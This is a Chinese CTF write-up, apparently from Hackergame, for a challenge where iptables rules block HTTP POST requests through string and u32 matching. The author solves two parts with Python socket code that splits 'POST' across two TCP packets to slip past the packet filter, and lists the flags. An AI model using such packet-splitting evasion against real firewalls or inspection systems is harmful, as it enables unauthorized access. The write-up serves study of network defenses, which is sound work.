## 18. Komm, süsser Flagge

> Now the flag is all mine  
> Can't live without the trust from ip tables

小 Z 写好了一个 flag 服务器，但是他不想让 flag 被轻易地获取，于是他在服务器上设置了一些防火墙规则。如果你的流量不幸被匹配上了，那么你的连接就会被切断。

尽管如此，聪明的小 Q 还是找到办法绕过了精心设计的规则，并偷走了小 Z 的 flag。

---

小 Z 部署的 iptables 规则如下：

```plain
*filter
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:myTCP-1 - [0:0]
:myTCP-2 - [0:0]
:myTCP-3 - [0:0]
-A INPUT -p tcp --dport 18080 -j myTCP-1
-A INPUT -p tcp --dport 18081 -j myTCP-2
-A INPUT -p tcp --dport 18082 -j myTCP-3

-A myTCP-1 -p tcp -m string --algo bm --string "POST" -j REJECT --reject-with tcp-reset

-A myTCP-2 -p tcp -m u32 --u32 "0 >> 22 & 0x3C @ 12 >> 26 @ 0 >> 24 = 0x50" -j REJECT --reject-with tcp-reset

-A myTCP-3 -p tcp -m string --algo bm --from 0 --to 50 --string "GET / HTTP" -j ACCEPT
-A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset
COMMIT
```

所有小题都需要 POST 你的 token 到 `/`，获取 flag，在没有以上规则的情况下，可以直接使用 `curl` 获取 flag（需要将 `114514:asdfgh==` 替换成你的 token）：

```plain
curl -X POST -d "114514:asdfgh==" http://题目地址
```

其中：

- 第一小题（我的 POST）位于 http://202.38.93.111:18080，对应防火墙规则中的 `myTCP-1` 链；
- 第二小题（我的 P）位于 http://202.38.93.111:18081，对应防火墙规则中的 `myTCP-2` 链；
- 第三小题（我的 GET）位于 http://202.38.93.111:18082，对应防火墙规则中的 `myTCP-3` 链。  
        注意：第三小问的链接可能无法直接在浏览器中打开，这是预期行为。

**某些网络环境下本题可能无法正常解出，你可以使用下面提供的 OpenVPN，并将上面的 IP 地址替换为 192.168.23.1 尝试解题，端口号不变。**

- [OpenVPN 配置文件](./hg-guest.ovpn)

点击下方的「打开/下载题目」按钮，下载附件。附件可以用于在 Docker 中复现题目的防火墙环境，其中 `main.go` 并非题目核心内容，仅供参考和测试，与实际运行的程序有所不同。

### 题目描述

> 附件：[iptables-flag.tar.gz](./iptables-flag.tar.gz)

### 尝试与解决

> 关键词：拆分数据包

#### 我的 POST

正常情况下一个 POST 请求是这样的：

```plain
POST / HTTP/1.1
Host: 202.38.93.111
Content-Length: 14

239:[redacted]
```

这样的请求文本可以通过 `nc 202.38.93.111:18080 < request1.txt` 发送给服务器。

而防火墙规则恰恰拦截了包含字符串 `POST` 的请求。HTTP 标准要求的 POST 格式必须包含完整的，ASCII 编码的 `POST`，大小写也不能互换，`main.go` 与 Golang 的 HTTP 库源代码也都表明了这一点。似乎没有办法绕过 `POST`。

然而，仔细思考，防火墙拦截的不是含 `POST` 的请求，而是含 `POST` 的 **TCP 数据包**！HTTP 是一种可以分块传输的协议，一个 TCP 数据包并不一定要包含完整的请求。于是，可以将单词 `POST` 拆分到两个数据包中。这一行为无法通过 `nc` 做到，可以用 Python socket 实现。

```python
import socket
from time import sleep

tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_addr = ("202.38.93.111", 18080)
tcp_socket.connect(server_addr)

data1 = '''PO'''
data2 = '''ST / HTTP/1.1
Host: example.com
Content-Length: 14

239:[redacted]
'''
# 注意 Content-Length 要与 token 实际长度匹配

tcp_socket.send(data1.encode())
sleep(1)
tcp_socket.send(data2.encode())
tcp_socket.send(''.encode())

msg = tcp_socket.recv(2048)
print(msg.decode())

tcp_socket.close()
```

立刻获得 flag。

#### 我的 P

这个防火墙规则似乎不太能看得懂，但是题目叫“我的 P”，为何不试试将 `P` 拆分到第一个数据包，其余拆分到第二个数据包呢？

```python
data1 = '''P'''
data2 = '''OST / HTTP/1.1
Host: example.com
Content-Length: 14

239:[redacted]
'''
# 注意 Content-Length 要与 token 实际长度匹配
```

Yes!

*这应该是个非预期解*

#### 我的 GET

这个服务器直接拒绝连接了，不太能想出来怎么搞。

### Flags

```plain
flag{ea5Y_sPl1tt3r_7ea4b86bcd}
```

Easy splitter. 指拆分数据包。

```plain
flag{r3s3rv3d_bYtes_b2a0c7be14}
```

Reserved bytes. 我不到啊
